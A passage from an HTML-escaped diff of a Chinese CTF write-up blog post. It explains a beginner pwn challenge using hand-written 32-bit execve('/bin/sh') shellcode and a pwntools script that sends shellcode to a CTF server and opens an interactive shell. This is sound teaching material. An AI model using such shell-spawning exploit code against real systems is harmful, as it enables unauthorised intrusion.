+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 将生成的 Shellcode 发送到目标&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;创建一个python文件，输入这些代码放到终端上运行，记得提前打开另外一个窗口进行nc连接远程靶机。&lt;/p&gt;
+&lt;p&gt;上面其它的python代码没啥可讲的，这是远程交互的模板代码，直接套就好，我现在重在讲解这个手搓的shellcode，它和shellcraft模块产生的shellcode效果一样的，而且还好看懂：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; syscall号：11对应execve&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; argv参数为NULL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; envp参数为NULL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0068732f&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;; 压栈字符串&amp;#34;/sh\0&amp;#34;（小端序存储）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6e69622f&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;; 压栈字符串&amp;#34;/bin&amp;#34;（小端序存储）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; ebx指向栈顶的&amp;#34;/bin/sh&amp;#34;字符串地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; 触发系统调用&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote class=&#34;alert alert-note&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;这 7 行代码通过精准设置寄存器和栈数据，完成了&lt;code&gt;execve&lt;/code&gt;系统调用的参数准备，最终实现 “用&lt;code&gt;/bin/sh&lt;/code&gt;替换当前进程” 的效果，是 CTF 中获取 shell 的基础手段，逻辑清晰且精简（仅 23 字节）。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;h4 id=&#34;逐行解析手敲shellcode&#34;&gt;逐行解析手敲shellcode
+&lt;/h4&gt;&lt;p&gt;思路：注入一段能执行/bin/sh的汇编语言代码&lt;/p&gt;
+&lt;p&gt;① &lt;code&gt;mov eax, 0xb&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;eax&lt;/code&gt;寄存器在 32 位 Linux 系统调用中专门用于传递 “系统调用号”（告诉内核要执行哪个系统调用）。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0xb&lt;/code&gt;是十六进制，转换为十进制是&lt;code&gt;11&lt;/code&gt;，而&lt;code&gt;11&lt;/code&gt;正是&lt;code&gt;execve&lt;/code&gt;系统调用对应的编号（内核通过这个值识别要执行&lt;code&gt;execve&lt;/code&gt;）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;② &lt;code&gt;mov ecx, 0&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ecx&lt;/code&gt;寄存器用于传递&lt;code&gt;execve&lt;/code&gt;的第二个参数&lt;code&gt;argv&lt;/code&gt;（参数列表）。&lt;/li&gt;
+&lt;li&gt;传&lt;code&gt;0&lt;/code&gt;（即&lt;code&gt;NULL&lt;/code&gt;）表示 “没有参数”，等价于在命令行直接输入&lt;code&gt;/bin/sh&lt;/code&gt;（不带任何参数）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;③ &lt;code&gt;mov edx, 0&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;edx&lt;/code&gt;寄存器用于传递&lt;code&gt;execve&lt;/code&gt;的第三个参数&lt;code&gt;envp&lt;/code&gt;（环境变量列表）。&lt;/li&gt;
+&lt;li&gt;传&lt;code&gt;0&lt;/code&gt;（即&lt;code&gt;NULL&lt;/code&gt;）表示 “没有环境变量”，内核会使用默认环境变量。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;④ &lt;code&gt;push 0x0068732f&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;push&lt;/code&gt;指令将数据压入栈中（栈是向下增长的内存区域）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0068732f&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;是十六进制的 “小端序” 存储（x86 架构默认小端序，即低地址存低位字节），转换为 ASCII 码：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0x2f&lt;/code&gt; → &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x73&lt;/code&gt; → &lt;code&gt;s&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x68&lt;/code&gt; → &lt;code&gt;h&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x00&lt;/code&gt; → 字符串结束符&lt;code&gt;\0&lt;/code&gt;
+所以这行实际是往栈上压入字符串&lt;code&gt;&amp;quot;/sh\0&amp;quot;&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;⑤ &lt;code&gt;push 0x6e69622f&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;同样是压栈操作，&lt;code&gt;0x6e69622f&lt;/code&gt;转换为 ASCII 码：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0x2f&lt;/code&gt; → &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x62&lt;/code&gt; → &lt;code&gt;b&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x69&lt;/code&gt; → &lt;code&gt;i&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x6e&lt;/code&gt; → &lt;code&gt;n&lt;/code&gt;
+所以这行往栈上压入字符串&lt;code&gt;&amp;quot;/bin&amp;quot;&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;结合上一行，栈上现在的内容是&lt;code&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/code&gt;（因为栈先压入&lt;code&gt;&amp;quot;/bin&amp;quot;&lt;/code&gt;，再压入&lt;code&gt;&amp;quot;/sh\0&amp;quot;&lt;/code&gt;，栈顶到栈底的顺序就是&lt;code&gt;/b/i/n//s/h/\0&lt;/code&gt;）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;⑥ &lt;code&gt;mov ebx, esp&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;esp&lt;/code&gt;是栈指针寄存器，永远指向当前栈顶的地址。&lt;/li&gt;
+&lt;li&gt;经过两次&lt;code&gt;push&lt;/code&gt;后，栈顶正好是&lt;code&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/code&gt;字符串的起始地址（第一个字符&lt;code&gt;&#39;/&#39;&lt;/code&gt;的位置）。&lt;/li&gt;
+&lt;li&gt;这行指令将栈顶地址存入&lt;code&gt;ebx&lt;/code&gt;，而&lt;code&gt;ebx&lt;/code&gt;寄存器在&lt;code&gt;execve&lt;/code&gt;系统调用中用于传递第一个参数&lt;code&gt;filename&lt;/code&gt;（程序路径），所以&lt;code&gt;ebx&lt;/code&gt;现在指向我们要执行的&lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;⑦ &lt;code&gt;int 0x80&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;int&lt;/code&gt;是中断指令，&lt;code&gt;0x80&lt;/code&gt;是 Linux 系统调用的中断号。&lt;/li&gt;
+&lt;li&gt;执行这条指令会触发一个软中断，让 CPU 从用户态切换到内核态，内核会根据&lt;code&gt;eax&lt;/code&gt;中的系统调用号（&lt;code&gt;11&lt;/code&gt;）执行&lt;code&gt;execve&lt;/code&gt;，并使用&lt;code&gt;ebx&lt;/code&gt;、&lt;code&gt;ecx&lt;/code&gt;、&lt;code&gt;edx&lt;/code&gt;中的参数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;总之：必须要定义好这几个寄存器，在最底层操作系统运行时都会用到的，这里不详细讲述，反正你知道这几个寄存器一开始就得这么定义就好啦。（不耐烦了）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb&lt;/span&gt;      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;       
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;push压栈时要记得字节限制，因为架构是x32，所以push最多4个字节，也就是push两个：/bin、/sh的地址（不满四个字节如/sh要记得用00填满哦不然会报错）&lt;/p&gt;
+&lt;p&gt;然后就是记得esp寄存器是动态的&amp;hellip;&lt;/p&gt;
+&lt;p&gt;这是调用pwntools的shellcraft模块的exp：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 设置日志级别为debug，会输出详细的交互过程&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)  # 本地调试时启用，用于启动本地的pwn程序&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28183&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 连接远程目标服务，地址为pwn.challenge.ctf.show，端口28183&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 生成一个执行/bin/sh的shellcode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 将shellcode发送给目标服务&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 进入交互模式，允许用户与目标服务进行交互（如执行命令）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这是它的shellcode（原版未修改过，直接复制粘贴上来的）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* execve&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin///sh&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* push b&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin///sh\x00&amp;#39;&lt;/span&gt; */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x68
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x732f2f2f
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x6e69622f
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        mov ebx, esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* push argument array &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sh\x00&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* push &lt;span class=&#34;s1&#34;&gt;&amp;#39;sh\x00\x00&amp;#39;&lt;/span&gt; */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push 0x1010101
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        xor dword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;esp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, 0x1016972
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        xor ecx, ecx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push ecx /* null terminate */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        pop ecx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        add ecx, esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push ecx /* &lt;span class=&#34;s1&#34;&gt;&amp;#39;sh\x00&amp;#39;&lt;/span&gt; */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        mov ecx, esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        xor edx, edx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /* call execve&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        push &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; /* 0xb */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        pop eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        int 0x80
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/65.png&#34;
+	width=&#34;1030&#34;
+	height=&#34;560&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/65_hu_a1098df37bfcfd3b.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/65_hu_199a30cfb9c2d5a8.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;调用pwntools所产生的shellcode&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;183&#34;
+		data-flex-basis=&#34;441px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看着确实比较乱&amp;hellip;..😅&lt;/p&gt;
+&lt;p&gt;最后的最后我想对这题做些评价加，其实不难主要是我初次做，讲得比较啰嗦，如果你会手敲shellcode或者调用pwntools的shellcraft模块的话还是很简单秒掉的。只能怪小生太cai了😄&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/67.png&#34;
+	width=&#34;856&#34;
